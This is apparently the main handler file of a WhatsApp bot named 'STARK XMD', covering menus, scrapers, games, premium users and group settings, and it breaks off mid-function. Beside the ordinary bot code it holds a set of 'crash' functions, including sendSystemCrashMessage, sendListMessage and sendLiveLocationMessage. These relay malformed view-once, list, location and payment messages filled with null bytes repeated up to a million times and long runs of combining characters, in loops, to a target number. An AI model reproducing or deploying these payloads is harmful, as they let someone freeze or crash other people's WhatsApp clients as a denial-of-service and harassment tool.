//STARK XMD BY T.ME/GWETHA
//reddragondfs//
require('./lib/menu');
const {
    downloadContentFromMessage,
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    InteractiveMessage,
    getContentType
} = require('@whiskeysockets/baileys');
const axios = require('axios');
const cheerio = require('cheerio');
const chalk = require('chalk');
const { color } = require('./lib/color');
const cron = require('node-cron');
const didyoumean = require('didyoumean');
const fetch = require('node-fetch');
const ffmpeg = require('fluent-ffmpeg');
const fs = require('fs');
const fsx = require('fs-extra');
const gis = require('g-i-s');
const gtts = require('node-gtts');
const moment = require('moment-timezone');
const ms = require('parse-ms');
const nou = require('node-os-utils');
const os = require('os');
const path = require('path');
const PhoneNumber = require('awesome-phonenumber');
const { performance } = require('perf_hooks');
const { randomBytes } = require('crypto');
const speed = require('performance-now');
const similarity = require('similarity');
const toMS = require('ms');
const translate = require('translate-google-api');
const util = require('util');
const yts = require('yt-search');
const readmore = String.fromCharCode(8206).repeat(4001);

const {
    igdl,
    ttdl,
    fbdown,
    twitter,
    youtube
} = require('btch-downloader');

const {
    addAfkUser,
    checkAfkUser,
    getAfkId,
    getAfkPosition,
    getAfkReason,
    getAfkTime
} = require('./lib/afk');

const {
    addFilter,
    addSpam,
    isFiltered,
    isSpam,
    ResetSpam
} = require('./lib/antispam');

const {
    addPremiumUser,
    checkPremiumUser,
    expiredCheck,
    getAllPremiumUser,
    getPremiumExpired,
    getPremiumPosition
} = require('./lib/premium');

const {
    addSewaGroup,
    getSewaExpired,
    getSewaPosition,
    checkSewaExpired,
    checkSewaGroup,
    getAllSewaGroups
} = require('./lib/sewa');

const {
    exec,
    execSync,
    spawn
} = require("child_process");

const {
    toAudio,
    toPTT,
    toVideo
} = require('./lib/converter');

const {
    smsg,
    await,
    clockString,
    delay,
    enumGetKey,
    fetchBuffer,
    fetchJson,
    format,
    formatDate,
    formatp,
    generateProfilePicture,
    getBuffer,
    getGroupAdmins,
    getRandom,
    isUrl,
    json,
    logic,
    msToDate,
    parseMention,
    sizeLimit,
    runtime,
    sleep,
    sort,
    toNumber
} = require('./lib/myfunc');

const {
    CatBox,
    fileIO,
    pomfCDN,
    uploadFile
} = require('./lib/uploader');

const {
    gameSlot,
    gameCasinoSolo,
    gameMerampok,
    daily,
    transferLimit,
    transferUang,
    buy,
    setUang,
    setLimit
} = require('./lib/game');

const {
    createUser,
    createServer,
    getEggStartupCommand,
    manageServer,
    deleteServer,
    deleteUser
} = require('./lib/cpanel');

const {
    getDnsRecords,
    createDnsRecord,
    deleteDnsRecord
} = require('./lib/csubdo');

const {
    jadibot,
    stopjadibot,
    listjadibot
} = require('./jadibot');

const threshold = 0.72


const playCommand = require('./plugins/play2');
const alightScrape = require('./lib/scrapers/alightmotion');
const BlueArchive = require('./lib/scrapers/bluearchive');
const BukaLapak = require('./lib/scrapers/bukalapak');
const chatSimi = require('./lib/scrapers/simsimi');
const fdown = require('./lib/scrapers/fdown');
const gempa = require('./lib/scrapers/bmkg');
const GDriveDl = require('./lib/scrapers/drive');
const halodoc = require('./lib/scrapers/halodoc');
const hentai = require('./lib/scrapers/hentai');
const Instagram = require('./lib/scrapers/instagram');
const jktNews = require('./lib/scrapers/jktNews');
const Kusonime = require('./lib/scrapers/kusonime');
const lyrics = require('./lib/scrapers/lyrics');
const otakuDesu = require('./lib/scrapers/otakudesu');
const pinterest = require('./lib/scrapers/pinterest');
const PlayStore = require('./lib/scrapers/playstore');
const quotesAnime = require('./lib/scrapers/quotesAnime');
const remini = require('./lib/scrapers/remini');
const savePin = require('./lib/scrapers/savepin');
const scrapeSoundCloud = require('./lib/scrapers/soundcloud');
const upscale = require('./lib/scrapers/upscale');

const {
    ffCh,
    ffChSkill,
    ffNews,
    ffPet,
    ffPetSkill
} = require('./lib/scrapers/freefire');

const {
    komiku,
    detail
} = require('./lib/scrapers/komiku');

const {
    tiktokSearchVideo,
    tiktokDownloaderVideo
} = require('./lib/scrapers/tiktok');

const {
    wallpaper,
    wikimedia,
    happymod,
    ringtone,
    umma,
    githubstalk,
    npmstalk,
    mlstalk
} = require('./lib/scrapers/scraper');

let afk = JSON.parse(fs.readFileSync('./src/afk.json'));
let ntnsfw = JSON.parse(fs.readFileSync('./src/data/function/nsfw.json'));
let bad = JSON.parse(fs.readFileSync('./src/data/function/badword.json'));
let banned = JSON.parse(fs.readFileSync('./src/data/function/banned.json'))
let blacklist = JSON.parse(fs.readFileSync('./src/data/function/blacklist.json'));
let whitelist = JSON.parse(fs.readFileSync('./src/data/function/whitelist.json'));
let premium = JSON.parse(fs.readFileSync('./src/data/role/premium.json'));
let owner = JSON.parse(fs.readFileSync('./src/data/role/owner.json'));
let sewa = JSON.parse(fs.readFileSync('./src/data/role/sewa.json'));
let contacts = JSON.parse(fs.readFileSync('./src/data/role/contacts.json'));
let userActivity = JSON.parse(fs.readFileSync('./src/data/role/user.json'));

let audionye = JSON.parse(fs.readFileSync('./media/database/audio.json'));
let setiker = JSON.parse(fs.readFileSync('./media/database/sticker.json'));
let imagenye = JSON.parse(fs.readFileSync('./media/database/image.json'));
let videonye = JSON.parse(fs.readFileSync('./media/database/video.json'));

let asahotak = {};
let caklontong = {};
let enhance = {};
let lengkapikalimat = {};
let mathgame = {};
let siapaaku = {};
let susunkata = {};
let tekateki = {};
let tebakaplikasi = {};
let tebakbendera = {};
let tebakchara = {};
let tebakff = {};
let tebakgame = {};
let tebakgambar = {};
let tebakhewan = {};
let tebakhero = {};
let tebakjkt48 = {};
let tebakkimia = {};
let tebakkabupaten = {};
let tebakkalimat = {};
let tebakkata = {};
let tebaklirik = {};
let tebaklogo = {};
let tebakml = {};
let tebaktebakan = {};
let verifyNumber = {};

try {
    let rawData = fs.readFileSync(`./src/${tempatDB}`);
    global.db.data = JSON.parse(rawData) || {};
} catch (err) {
    console.error(`⚠️ Failed to load ${tempatDB}, using default structure.`);
    global.db.data = {};
}

global.db.data = {
    sticker: global.db.data.sticker || {},
    database: global.db.data.database || {},
    game: global.db.data.game || {},
    others: global.db.data.others || {},
    users: global.db.data.users || {},
    rpg: global.db.data.rpg || {},
    chats: global.db.data.chats || {},
    settings: global.db.data.settings || {},
};

const time = moment.tz('Asia/Jakarta').format('HH:mm:ss');
const date = moment.tz('Asia/Jakarta').format('DD/MM/YYYY');
const time2 = moment.tz('Asia/Jakarta').format('HH:mm:ss');

let greeting = "Good Night 🌌";

if (time2 < "05:00:00") {
    greeting = "Good Morning 🌄";
} else if (time2 < "11:00:00") {
    greeting = "Good Morning 🌄";
} else if (time2 < "15:00:00") {
    greeting = "Good Afternoon 🌅";
} else if (time2 < "18:00:00") {
    greeting = "Good Evening 🌇";
} else if (time2 < "19:00:00") {
    greeting = "Good Evening 🌆";
}

async function checkBandwidth() {
    let ind = 0;
    let out = 0;
    for (let i of await require("node-os-utils").netstat.stats()) {
        ind += parseInt(i.inputBytes);
        out += parseInt(i.outputBytes);
    }
    return {
        download: formatp(ind),
        upload: formatp(out),
    };
};

module.exports = sock = async (sock, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        const body = m.body
        const budy = m.text
        const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : prefa
        const isCmd = body.startsWith(prefix)
        const isCommand = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ""
        const command = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ''
        const args = body.trim().split(/ +/).slice(1);
        const botNumber = await sock.decodeJid(sock.user.id);
        const pushname = m.pushName || "No Name"
        const text = q = args.join(" ");
        const getQuoted = (m.quoted || m);
        const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);

        const isMedia = /image|video|sticker|audio/.test(mime);
        const isImage = (type == 'imageMessage');
        const isVideo = (type == 'videoMessage');
        const isAudio = (type == 'audioMessage');
        const isDocument = (type == 'documentMessage');
        const isLocation = (type == 'locationMessage');
        const isContact = (type == 'contactMessage');
        const isSticker = (type == 'stickerMessage');
        const isText = (type == 'textMessage');
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage');
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage');
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage');
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage');
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage');
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage');
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage');
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage');

        const isGroup = m.key.remoteJid.endsWith('@g.us');
        const groupMetadata = m.isGroup ? await sock.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const isBan = banned.includes(m.sender);
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const AntiNsfw = m.isGroup ? ntnsfw.includes(m.chat) : false

        if (m.isGroup) {
            m.metadata = await sock.groupMetadata(m.chat)
            m.admins = (m.metadata.participants.reduce((a, b) => (b.admin ? a.push({ id: b.id, admin: b.admin }) : [...a]) && a, []))
            m.isAdmin = m.admins.some((b) => b.id === m.sender)
            m.participant = m.key.participant
            m.isBotAdmin = !!m.admins.find((member) => member.id === botNumber)
        }

        const clientId = sock.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? sock.user.id.split(':')[0] + "@s.whatsapp.net" || sock.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
        const isBot = clientId.includes(senderId);

        const isSewa = checkSewaGroup(m.chat);
        const isBlacklist = blacklist.includes(m.sender);
        const isWhitelist = whitelist.includes(m.sender);
        const isAfkOn = checkAfkUser(m.sender, afk)
        const isUser = userActivity.includes(m.sender);
        const isVip = db.data && db.data.users && db.data.users[m.sender] ? db.data.users[m.sender].vip : false;
        const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isCreator || checkPremiumUser(m.sender, premium);
        expiredCheck(sock, m, premium);
        checkSewaExpired(sock);

        let timestamp = speed();
        let latensi = speed() - timestamp;

        let usernomor = await PhoneNumber('+' + m.sender.replace('@s.whatsapp.net', '')).getNumber('international');
        let ownnomor = await PhoneNumber('+' + ownerNumber.replace('@s.whatsapp.net', '')).getNumber('international');

        const fm = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: "0@s.whatsapp.net"
                } : {})
            },
            message: {
                conversation: prefix + command
            }
        };

        const fconver = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: "0@s.whatsapp.net"
                } : {})
            },
            message: {
                conversation: `👤 *${pushname}*\n📞 *${usernomor}*`
            }
        };

        const fmen = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: "0@s.whatsapp.net"
                } : {})
            },
            message: {
                conversation: `📝 *New Confession Message!* ✨`
            }
        };

        async function newReply(teks) {
            if (typereply === 'v1') {
                m.reply(teks);
            } else if (typereply === 'v2') {
                sock.sendMessage(m.chat, {
                    contextInfo: {
                        mentionedJid: parseMention(teks),
                        forwardingScore: 999999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterName: saluranName,
                            newsletterJid: saluran,
                        },
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botName,
                            body: ownerName,
                            previewType: "PHOTO",
                            thumbnailUrl: imageUrl,
                            sourceUrl: wagc
                        }
                    },
                    text: teks
                }, {
                    quoted: m
                });
            } else if (typereply === 'v3') {
                sock.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        mentionedJid: parseMention(teks),
                        forwardingScore: 999999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterName: saluranName,
                            newsletterJid: saluran,
                        },
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botName,
                            body: ownerName,
                            thumbnailUrl: imageUrl,
                            sourceUrl: website,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                });
            } else if (typereply === 'v4') {
                const newrep = {
                    contextInfo: {
                        mentionedJid: parseMention(teks),
                        forwardingScore: 999999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterName: saluranName,
                            newsletterJid: saluran,
                        },
                        externalAdReply: {
                            showAdAttribution: true,
                            title: greeting,
                            body: botName,
                            thumbnailUrl: imageUrl,
                            sourceUrl: website
                        }
                    },
                    text: teks
                };
                return sock.sendMessage(m.chat, newrep, {
                    quoted: m,
                });
            }
        };

        function capitalizeWords(str) {
            return str
                .split(' ')
                .map(word => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase())
                .join(' ');
        }

        const pickRandom = (arr) => {
            return arr[Math.floor(Math.random() * arr.length)]
        };

        async function getGroupName(jid) {
            try {
                let res = await sock.groupMetadata(jid)
                return res.subject
            } catch (err) {
                return 'Anonymous'
            }
        };

        function randomNomor(min, max = null) {
            if (max !== null) {
                min = Math.ceil(min);
                max = Math.floor(max);
                return Math.floor(Math.random() * (max - min + 1)) + min;
            } else {
                return Math.floor(Math.random() * min) + 1
            }
        };

        try {
            let isNumber = x => typeof x === 'number' && !isNaN(x);

            let user = db.data.users[m.sender] || {};
            if (typeof user !== 'object') db.data.users[m.sender] = {};

            let isPremium = checkPremiumUser(m.sender, premium);
            let limitUser = user.vip ? global.limit.vip : isPremium ? global.limit.premium : global.limit.free;
            let uangUser = user.vip ? global.uang.vip : isPremium ? global.uang.premium : global.uang.free;

            if (!('rpg' in user)) user.rpg = false;
            if (!('daftar' in user)) user.daftar = false;
            if (!('vip' in user)) user.vip = false;
            if (!('badword' in user)) user.badword = 0;
            if (!('title' in user)) user.title = '';
            if (!('serialNumber' in user)) user.serialNumber = randomBytes(16).toString('hex');
            if (!('nick' in user)) user.nick = sock.getName(m.sender);
            if (!('nama' in user)) user.nama = 'Guest';
            if (!('pacar' in user)) user.pacar = '';
            if (!('askot' in user)) user.askot = '';
            if (!isNumber(user.umur)) user.umur = 0;
            if (!isPremium) user.premium = false;
            if (!('totalLimit' in user)) user.totalLimit = limitUser;
            if (!isNumber(user.limit)) user.limit = limitUser;
            if (!('uang' in user)) user.uang = uangUser;
            if (!('lastclaim' in user)) user.lastclaim = new Date().getTime();
            if (!('lastrampok' in user)) user.lastrampok = new Date().getTime();
            if (!('pctime' in user)) user.pctime = '';
            if (!isNumber(user.coins)) user.coins = 0
            if (!isNumber(user.uang)) user.uang = 0
            if (!isNumber(user.exp)) user.exp = 0
            if (!isNumber(user.rank)) user.rank = 700
            if (!isNumber(user.level)) user.level = 0

            db.data.users[m.sender] = user;

            let rpg = db.data.rpg[m.sender] || {};
            if (typeof rpg !== 'object') db.data.rpg[m.sender] = {};

            if (!('kapal' in rpg)) rpg.kapal = false
            if (!('darahkapal' in rpg)) rpg.darahkapal = 100
            if (!('pickaxe' in rpg)) rpg.pickaxe = false
            if (!('darahpickaxe' in rpg)) rpg.darahpickaxe = 100
            if (!('kapak' in rpg)) rpg.kapak = false
            if (!('darahkapak' in rpg)) rpg.darahkapak = 100
            if (!('bzirah' in rpg)) rpg.bzirah = false
            if (!('darahbzirah' in rpg)) rpg.darahbzirah = 100
            if (!('pedang' in rpg)) rpg.pedang = false
            if (!('darahpedang' in rpg)) rpg.darahpedang = 100
            if (!('darahuser' in rpg)) rpg.darahuser = 100
            if (!('rumah' in rpg)) rpg.rumah = 0
            if (!('besi' in rpg)) rpg.besi = 4
            if (!('kayu' in rpg)) rpg.kayu = 2
            if (!('emas' in rpg)) rpg.emas = 0
            if (!('perak' in rpg)) rpg.perak = 0
            if (!('batubara' in rpg)) rpg.batubara = 0
            if (!('bulu' in rpg)) rpg.bulu = 0
            if (!('kain' in rpg)) rpg.kain = 0
            if (!('wilayah' in rpg)) rpg.wilayah = "Indonesia"
  
if (!('wilayahrumah' in rpg)) rpg.wilayahrumah = "Indonesia"
if (!('musuh' in rpg)) rpg.musuh = 0
if (!('ikan' in rpg)) rpg.ikan = 0
if (!('domba' in rpg)) rpg.domba = 0
if (!('sapi' in rpg)) rpg.sapi = 0
if (!('ayam' in rpg)) rpg.ayam = 0
if (!('bank' in rpg)) rpg.bank = 0
if (!('burutime' in rpg)) rpg.burutime = 0
if (!('lastclaim' in rpg)) rpg.lastclaim = 0
if (!('lastdagang' in rpg)) rpg.lastdagang = 0
if (!('lastbansos' in rpg)) rpg.lastbansos = 0
if (!('lastkerja' in rpg)) rpg.lastkerja = 0
if (!('lastrampok' in rpg)) rpg.lastrampok = 0

db.data.rpg[m.sender] = rpg;

let chats = db.data.chats[m.chat] || {};
if (typeof chats !== 'object') db.data.chats[m.chat] = {};

if (!('badword' in chats)) chats.badword = false;
if (!('antiforeignnum' in chats)) chats.antiforeignnum = false;
if (!('antiviewonce' in chats)) chats.antiviewonce = false;
if (!('autoaipc' in chats)) chats.autoaipc = false;
if (!('autoaigc' in chats)) chats.autoaigc = false;
if (!('antibot' in chats)) chats.antibot = false;
if (!('antispam' in chats)) chats.antispam = false;
if (!('antimedia' in chats)) chats.antimedia = false;
if (!('antiimage' in chats)) chats.antiimage = false;
if (!('antivideo' in chats)) chats.antivideo = false;
if (!('antiaudio' in chats)) chats.antiaudio = false;
if (!('antisticker' in chats)) chats.antisticker = false;
if (!('anticontact' in chats)) chats.anticontact = false;
if (!('antilocation' in chats)) chats.antilocation = false;
if (!('antidocument' in chats)) chats.antidocument = false;
if (!('antilink' in chats)) chats.antilink = false;
if (!('antilinkgc' in chats)) chats.antilinkgc = false;
if (!('mute' in chats)) chats.mute = false;
if (!('liststore' in chats)) chats.liststore = {};

db.data.chats[m.chat] = chats;

let setting = db.data.settings[botNumber] || {};
if (typeof setting !== 'object') db.data.settings[botNumber] = {};

if (!('totalhit' in setting)) setting.totalhit = 0;
if (!('totalError' in setting)) setting.totalError = 0;
if (!('online' in setting)) setting.online = false;
if (!('safesearch' in setting)) setting.safesearch = false;
if (!('autosticker' in setting)) setting.autosticker = false;
if (!('autodownload' in setting)) setting.autodownload = false;
if (!('autobio' in setting)) setting.autobio = false;
if (!('autoread' in setting)) setting.autoread = false;
if (!('autorecordtype' in setting)) setting.autorecordtype = false;
if (!('autorecord' in setting)) setting.autorecord = false;
if (!('autotype' in setting)) setting.autotype = false;
if (!('autoblocknum' in setting)) setting.autoblocknum = false;
if (!('onlygc' in setting)) setting.onlygc = false;
if (!('onlypc' in setting)) setting.onlypc = false;
if (!('watermark' in setting)) setting.watermark = { packname: global.packname, author: global.author };
if (!('about' in setting)) setting.about = {
    bot: { nick: sock.getName(botNumber), alias: botName },
    owner: { nick: sock.getName(ownerNumber + '@s.whatsapp.net'), alias: ownerNumber }
};

db.data.settings[botNumber] = setting;

} catch (err) {
console.error('⚠️ An error occurred:', err);
}

const react = async () => {
const emojis = ["🌷", "🤙", "😂", "🤣", "😭", "🫂", "💔", "😡"];
for (const emoji of emojis) {
    await sleep(80);
    await sock.sendMessage(m.chat, { react: { text: emoji, key: m.key } });
}
await sleep(50);
const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
await sock.sendMessage(m.chat, { react: { text: randomEmoji, key: m.key } });
};

async function sendRepeatedMessages(jid, count) {
for (let i = 0; i < count; i++) {
sock.sendMessage(recipientJid, {
        'text': ''.repeat(50000)
    }, {
        'participant': {
            'jid': jid
        },
        'messageId': etc.key.id
    }, {
        'quoted': m
    });
}
}

async function sendViewOnceMessages(jid, count) {
for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
        'viewOnceMessage': {
            'message': {
                'messageContextInfo': {
                    'deviceListMetadata': {},
                    'deviceListMetadataVersion': 2
                },
                'interactiveMessage': proto.Message.InteractiveMessage.create({
                    'body': proto.Message.InteractiveMessage.Body.create({
                        'text': ''
                    }),
                    'footer': proto.Message.InteractiveMessage.Footer.create({
                        'text': ''
                    }),
                    'header': proto.Message.InteractiveMessage.Header.create({
                        'title': '',
                        'subtitle': '',
                        'hasMediaAttachment': false
                    }),
                    'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        'buttons': [{
                            'name': "cta_url",
                            'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
                        }],
                        'messageParamsJson': "\0".repeat(100000)
                    })
                })
            }
        }
    }, {});
    sock.relayMessage(jid, messageContent.message, {
        'messageId': messageContent.key.id
    });
}
}

async function sendSystemCrashMessage(jid) {
let messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
        'message': {
            'interactiveMessage': {
                'header': {
                    'title': '',
                    'subtitle': " "
                },
                'body': {
                    'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
                },
                'footer': {
                    'text': 'xp'
                },
                'nativeFlowMessage': {
                    'buttons': [{
                        'name': 'cta_url',
                        'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :	}"
                    }],
                    'messageParamsJson': "\0".repeat(1000000)
                }
            }
        }
    }
}), {
    'userJid': jid
});
await sock.relayMessage(jid, messageContent.message, {
    'participant': {
        'jid': jid
    },
    'messageId': messageContent.key.id
});
}
async function sendListMessage(jid) {
let messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
        'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
        'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
        'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
            'productSections': [{
                'title': "lol",
                'products': [{
                    'productId': "4392524570816732"
                }]
            }],
            'productListHeaderImage': {
                'productId': "4392524570816732",
                'jpegThumbnail': null
            },
            'businessOwnerJid': "0@s.whatsapp.net"
        }
    },
    'footer': "lol",
    'contextInfo': {
        'expiration': 600000,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
            'initiator': "INITIATED_BY_ME"
        }
    },
    'selectListType': 2,
    'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
    }
}), {
    'userJid': jid
});

await sock.relayMessage(jid, messageContent.message, {
    'participant': {
        'jid': jid
    },
    'messageId': messageContent.key.id
});
}

async function sendLiveLocationMessage(jid) {
let messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
        'message': {
            'liveLocationMessage': {
                'degreesLatitude': 'p',
                'degreesLongitude': 'p',
                'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
                'sequenceNumber': '0',
                'jpegThumbnail': ''
            }
        }
    }
}), {
    'userJid': jid
});

await sock.relayMessage(jid, messageContent.message, {
    'participant': {
        'jid': jid
    },
    'messageId': messageContent.key.id
});
}

async function sendExtendedTextMessage(jid) {
sock.relayMessage(jid, {
    'extendedTextMessage': {
        'text': '.',
        'contextInfo': {
            'stanzaId': jid,
            'participant': jid,
            'quotedMessage': {
                'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000)
            },
            'disappearingMode': {
                'initiator': "CHANGED_IN_CHAT",
                'trigger': "CHAT_SETTING"
            }
        },
        'inviteLinkGroupTypeV2': "DEFAULT"
    }
}, {
    'participant': {
        'jid': jid
    }
}, {
    'messageId': null
});
}
async function sendPaymentInvite(jid) {
sock.relayMessage(jid, {
    'paymentInviteMessage': {
        'serviceType': "UPI",
        'expiryTimestamp': Date.now() + 86400000
    }
}, {
    'participant': {
        'jid': jid
    }
});
}

async function sendMultiplePaymentInvites(jid, count) {
for (let i = 0; i < count; i++) {
    sendPaymentInvite(jid);
    sendExtendedTextMessage(jid);
    await sleep(500);
}
}

async function sendVariousMessages(jid, count) {
for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    sendLiveLocationMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
}
}

async function sendRepeatedMessages2(jid, count) {
for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
}
}

async function sendMixedMessages(jid, count) {
for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
}
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
if (quoted == null || quoted == undefined || quoted == false) {
    return sock.sendMessage(m.chat, {
        'text': text,
        'mentions': mentions
    }, {
        'quoted': m
    });
} else {
    return sock.sendMessage(m.chat, {
        'text': text,
        'mentions': mentions
    }, {
        'quoted': m
    });
}
}

async function editp(teks1, teks2, teks3) {
let nedd = [
    `${teks1}`,
    `${teks2}`,
    `${teks3}`
]
let {
    key
} = await sock.sendMessage(m.chat, {
    text: '*Loading...*'
}, {
    quoted: m
})

for (let i = 0; i < nedd.length; i++) {
    await sleep(2000)
    await sock.sendMessage(m.chat, {
        text: nedd[i],
        edit: key
    });
}
}

async function loading() {
const lod = [
    "█▒▒▒▒▒▒▒▒▒▒▒ 10%",
    "████▒▒▒▒▒▒▒▒ 30%",
    "███████▒▒▒▒▒ 50%",
    "██████████▒▒ 80%",
    "████████████ 100%"
];
const { key } = await sock.sendMessage(m.chat, { 
    text: mess.wait 
}, { 
    quoted: m 
});

for (let i = 0; i < lod.length; i++) {
    await sleep(600);
    await sock.sendMessage(m.chat, { 
        text: lod[i], 
        edit: key 
    });
}
};

async function addExifAvatar(buffer, packname, author, categories = [''], extra = {}) {
const { default: { Image } } = await import('node-webpmux');
const img = new Image();

const json = {
    'sticker-pack-id': 'Natsxe',
    'sticker-pack-name': packname,
    'sticker-pack-publisher': author,
    'emojis': categories,
    'is-avatar-sticker': 1,
    ...extra
};

let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00]);
let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8');
let exif = Buffer.concat([exifAttr, jsonBuffer]);

exif.writeUIntLE(jsonBuffer.length, 14, 4);

await img.load(buffer);
img.exif = exif;

return await img.save(null);
}

function generateRandomPassword(length) {
let result = '';
const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
const charactersLength = characters.length;

for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
}

return result;
};

async function generateRandomHexName(length) {
return randomBytes(Math.ceil(length / 2)).toString('hex').slice(0, length);
};

function formatBytes(bytes) {
if (bytes === 0) return '0 Byte';

const k = 1024;
const sizes = ['Byte', 'KB', 'MB', 'GB', 'TB'];
const i = Math.floor(Math.log(bytes) / Math.log(k));

return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function formatDuration(ms) {
let seconds = Math.floor((ms / 1000) % 60);
let minutes = Math.floor((ms / (1000 * 60)) % 60);
let hours = Math.floor((ms / (1000 * 60 * 60)) % 24);
return `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
}

function formatAngka(angka, options = {}) {
const {
    locale = 'id-ID', // Default using Indonesian format
    style = 'decimal', // Can be 'decimal', 'currency', or 'percent'
    currency = 'IDR', // Default to IDR if style is 'currency'
    minimumFractionDigits = 0, // Minimum digits after decimal
    maximumFractionDigits = 2 // Maximum digits after decimal
} = options;

return new Intl.NumberFormat(locale, {
    style: style,
    currency: currency,
    minimumFractionDigits: minimumFractionDigits,
    maximumFractionDigits: maximumFractionDigits
}).format(angka);
};

if (!m.isGroup && !isCreator && !isPremium && db.data.settings[botNumber].onlygc) {
    if (command) {
        let captionText = "⚠️ *「 WARNING 」* ⚠️\n";
        captionText += "Hi! 👋 This bot can only be used in groups.\n\n";
        captionText += "🤔 Want the bot active in your group?\n";
        captionText += "*Rent or buy premium now!*\n\n";
        captionText += `Contact admin: wa.me/${ownerNumber}`;
